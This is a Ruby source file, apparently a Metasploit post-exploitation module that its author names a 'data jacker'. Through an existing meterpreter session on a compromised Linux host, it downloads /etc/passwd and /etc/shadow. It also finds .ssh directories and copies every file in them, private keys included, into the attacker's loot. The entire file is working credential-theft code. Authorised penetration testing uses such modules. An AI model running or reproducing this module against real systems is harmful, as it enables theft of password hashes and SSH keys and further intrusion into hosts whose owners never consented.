	# $Id: passwd-shadow-ssh-jacker-meterpreter.rb 2012-05-01 rapid7 $

	##
	# This file is part of the Metasploit Framework and may be subject to
	# redistribution and commercial restrictions. Please see the Metasploit
	# web site for more information on licensing and terms of use.
	#   http://metasploit.com/
	##

	require 'msf/core'
	require 'rex'
	require 'msf/core/post/common'
	require 'msf/core/post/file'
	require 'msf/core/post/linux/priv'
	require 'msf/core/post/linux/system'


	class Metasploit3 < Msf::Post

		include Msf::Post::Common
		include Msf::Post::File
		include Msf::Auxiliary::Report
		include Msf::Post::Linux::Priv
		include Msf::Post::Linux::System
		include Msf::Post::Unix
		def initialize(info={})
			super( update_info( info,
					'Name'          => 'Linux Important Data Jacker',
					'Description'   => %q{
						This module will download /etc/passwd /etc/shadow and try to find SSH keys and download them
					},
					'License'       => MSF_LICENSE,
					'Author'        => [ 'balgan <balgan[at]balgan.eu>','SSH based on ohdae module', ],
					'Version'       => '$Revision: 3195e713 $',
					'Platform'      => [ 'linux'],
					'SessionTypes'  => [ 'meterpreter']
				))
		end


		def execute(cmd)
			output = cmd_exec(cmd)
			return output
		end

		def run
			print_status("Attempting to steal information it will be saved in loot folder")
			jack_etc()
			get_ssh_keys()
		end

		def cat_file(filename)
			print_status("Download: #{filename}")
			output = read_file(filename)
			return output
		end

	def get_ssh_keys
				i = 0;
				dirs = execute("/usr/bin/find / -maxdepth 3 -name .ssh").split("\n")
				if dirs.empty? == true
					print_status("COULD NOT FIND .SSH, might be permissions issue")
				else
				print_status("Found SSH AT: #{dirs}")
				dirs.each do |d|
				files = execute("/bin/ls -a #{d}").chomp.split()
				files.each do |f|
					data = ""
					next if f =~/^(\.+)$/
						print_status("Trying to extract: #{f} from #{d}")
						this_key = cat_file("#{d}/#{f}")
					begin
					filesaving = session.fs.file.new("#{d}/#{f}", "rb")
					until filesaving.eof?
						data << filesaving.read
					end
					store_loot("#{f}", "application/octet-stream", session, data, f, "loot #{f}")
				rescue ::Interrupt
					raise $!
				rescue ::Exception => e
					print_error("Failed to download #{f}: #{e.class} #{e}")
				end
				end
			end
		end
		end

		def jack_etc()
			filestojack = ["/etc/passwd", "/etc/shadow"]
			filestojack.each do |f|
				data = ""
					print_status("Looking for: #{f}")
					found    = session.fs.file.stat(f) rescue nil
				return if not found	
				begin
				filesaving = session.fs.file.new(f, "rb")
				until filesaving.eof?
					data << filesaving.read
				end
				store_loot("#{f}", "application/octet-stream", session, data, f, "loot #{f}")
			rescue ::Interrupt
				raise $!
			rescue ::Exception => e
				print_error("Failed to download #{f}: #{e.class} #{e}")
			end
			end		
	end
end
